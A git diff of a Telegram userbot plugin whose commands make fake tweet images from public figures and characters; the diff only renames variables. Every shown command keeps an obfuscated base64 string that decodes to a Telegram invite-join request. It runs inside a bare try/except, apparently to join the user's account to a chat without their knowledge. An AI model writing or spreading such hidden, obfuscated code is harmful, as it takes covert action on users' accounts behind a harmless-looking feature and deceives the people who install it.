@@ -1,12 +1,12 @@
 from . import *
 
 
-@bot.on(d3vil_cmd(pattern=r"tweet(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
 async def nope(kraken):
-    d3vil = kraken.pattern_match.group(1)
+    mafia = kraken.pattern_match.group(1)
     okvai = await eor(kraken, "Trying to tweet for you...")
-    if not d3vil:
+    if not mafia:
         if kraken.is_reply:
             (await kraken.get_reply_message()).message
         else:
@@ -22,7 +22,7 @@ async def nope(kraken):
     await kraken.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"trump(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"trump(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -41,12 +41,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting trump to tweet...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(d3vil)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -55,7 +55,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"modi(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"modi(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -74,12 +74,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting modi to tweet...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(d3vil)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -88,7 +88,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"mia(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"mia(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -107,12 +107,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting Mia to tweet...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(d3vil)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -121,7 +121,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"dani(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"dani(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -140,7 +140,7 @@ async def nekobot(event):
             return
     await eor(event, "Requesting Dani to tweet...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
@@ -155,7 +155,7 @@ async def nekobot(event):
 
 
 # @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
-@bot.on(d3vil_cmd(pattern=r"pappu(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"pappu(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -174,7 +174,7 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting pappu to tweet...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
@@ -188,7 +188,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"sunny(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"sunny(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -207,7 +207,7 @@ async def nekobot(event):
             return
     await eor(event, "Requesting sunny to tweet...🥰")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
@@ -221,7 +221,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"johhny(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"johhny(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -240,7 +240,7 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting johhny to tweet...😆")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
@@ -254,7 +254,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(d3vil_cmd(pattern=r"gandhi(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"gandhi(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -273,7 +273,7 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting baapu to tweet...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
@@ -287,7 +287,7 @@ async def nekobot(event):
     await event.delete()  # bancho kitni baar bolu no offence
 
 
-@bot.on(d3vil_cmd(pattern=r"cmm(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"cmm(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -306,7 +306,7 @@ async def nekobot(event):
             return
     await eor(event, "Your banner is under creation wait a sec...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
@@ -321,7 +321,7 @@ async def nekobot(event):
 
 
 
-@bot.on(d3vil_cmd(pattern=r"kanna(?: |$)(.*)"))
+@bot.on(mafia_cmd(pattern=r"kanna(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -340,7 +340,7 @@ async def nekobot(event):
             return
     await eor(event, "Kanna is writing your text...")
     try:
-        d3vil = str(
+        mafia = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
